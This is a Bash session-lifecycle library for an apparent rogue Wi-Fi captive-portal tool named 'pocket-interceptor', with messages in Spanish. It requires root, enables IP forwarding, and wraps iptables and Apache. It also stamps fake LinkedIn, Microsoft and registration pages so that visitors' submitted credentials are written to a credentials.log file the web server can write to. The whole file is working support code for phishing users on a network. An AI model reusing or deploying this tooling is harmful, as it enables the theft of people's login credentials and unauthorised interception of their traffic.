#!/bin/bash
# Shared lifecycle for portal execution. Source this file; it performs no changes.

SESSION_HELPER="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../tools" && pwd)/session_state.py" || return 1
[[ -f "$SESSION_HELPER" ]] || return 1
SESSION_DIRECTORY=""
SESSION_TAG=""
SESSION_CHILD_PID=""

session_command() {
    python3 "$SESSION_HELPER" "$1" "$SESSION_DIRECTORY" "${@:2}"
}

session_cleanup() {
    [[ -n "$SESSION_DIRECTORY" ]] || return 0
    if [[ -n "$SESSION_CHILD_PID" ]]; then
        kill -TERM "$SESSION_CHILD_PID" 2>/dev/null || true
        local count
        for ((count=0; count<30; count++)); do
            kill -0 "$SESSION_CHILD_PID" 2>/dev/null || break
            sleep 0.1
        done
        kill -KILL "$SESSION_CHILD_PID" 2>/dev/null || true
        wait "$SESSION_CHILD_PID" 2>/dev/null || true
        SESSION_CHILD_PID=""
    fi
    if session_command finish; then
        # Keep private backups and generated files available for inspection/recovery.
        printf '[+] Sesión restaurada. Registro privado: %s\n' "$SESSION_DIRECTORY"
        SESSION_DIRECTORY=""
    else
        printf '[!] Restauración incompleta. Conserva el registro: %s\n' "$SESSION_DIRECTORY" >&2
        return 1
    fi
}

session_exit() {
    local status=$?
    trap - EXIT
    # Allow recovery to finish if another interrupt arrives during cleanup.
    trap '' INT TERM HUP
    session_cleanup || { [[ $status -ne 0 ]] || status=1; }
    exit "$status"
}

session_register_traps() {
    trap session_exit EXIT
    trap 'exit 130' INT
    trap 'exit 143' TERM
    trap 'exit 129' HUP
}

session_begin() {
    [[ -z "$SESSION_DIRECTORY" ]] || return 1
    if [[ $EUID -ne 0 ]]; then
        printf '[!] El portal necesita permisos root.\n' >&2
        return 1
    fi
    # /run is root-owned. The descriptor remains locked until the subshell exits.
    command -v flock >/dev/null || return 1
    exec {SESSION_LOCK_FD}>>/run/pocket-interceptor.lock || return 1
    if ! flock -n "$SESSION_LOCK_FD"; then
        printf '[!] Ya hay otra sesión del portal en ejecución.\n' >&2
        return 1
    fi
    umask 077
    SESSION_DIRECTORY=$(mktemp -d /tmp/pocket-interceptor.XXXXXXXX) || return 1
    if ! SESSION_TAG=$(session_command begin "$SELECTED_INTERFACE"); then
        printf '[!] No se pudo guardar el estado; no se iniciará el portal. Registro: %s\n' "$SESSION_DIRECTORY" >&2
        SESSION_DIRECTORY=""
        return 1
    fi
    session_register_traps
    DIRECTORY="$SESSION_DIRECTORY/generated/"
}

session_service() { session_command service "$@"; }
session_apache() { session_command apache "$@"; }
session_iptables() { session_command iptables "$@"; }

session_enable_forwarding() {
    session_command forwarding && sysctl -w net.ipv4.ip_forward=1
}

session_run_foreground() {
    local status
    "$@" &
    SESSION_CHILD_PID=$!
    wait "$SESSION_CHILD_PID"
    status=$?
    SESSION_CHILD_PID=""
    return "$status"
}

session_prepare_web_files() {
    local filename
    # Stamp only this session's PHP firewall calls, including dynamically added rules.
    for filename in "$FILE_REGISTER" "$FILE_LINKEDIN" "$FILE_MICROSOFT"; do
        if [[ -f "${DIRECTORY}${filename}" ]]; then
            sed -i -e "s/__POCKET_SESSION_TAG__/$SESSION_TAG/g" \
                -e "s|__POCKET_RESULTS_FILE__|$SESSION_DIRECTORY/results/credentials.log|g" \
                "${DIRECTORY}${filename}" || return 1
        fi
    done
}

session_web_permissions() {
    local filename
    for filename in "$FILE_INDEX" "$FILE_REGISTER" "$FILE_CSS" "$FILE_LINKEDIN" "$FILE_MICROSOFT"; do
        if [[ -f "${DIRECTORY}${filename}" && -f "${DIR_WEB}${filename}" ]]; then
            chmod 644 "${DIR_WEB}${filename}" || return 1
        fi
    done
    for filename in "$LOGO_LINKEDIN" "$LOGO_MICROSOFT"; do
        if [[ -f "${DIR_WEB}${filename}" ]]; then
            chmod 644 "${DIR_WEB}${filename}" || return 1
        fi
    done
    # Create files while the directory still belongs to root; grant the web worker
    # access only afterwards. Backups, the journal and generated sources stay private.
    mkdir -m 700 "$SESSION_DIRECTORY/results" || return 1
    touch "$SESSION_DIRECTORY/results/credentials.log" || return 1
    chmod 600 "$SESSION_DIRECTORY/results/credentials.log" || return 1
    chown www-data:www-data "$SESSION_DIRECTORY/results/credentials.log" \
        "$SESSION_DIRECTORY/results" || return 1
    chgrp www-data "$SESSION_DIRECTORY" || return 1
    chmod 710 "$SESSION_DIRECTORY" || return 1
}
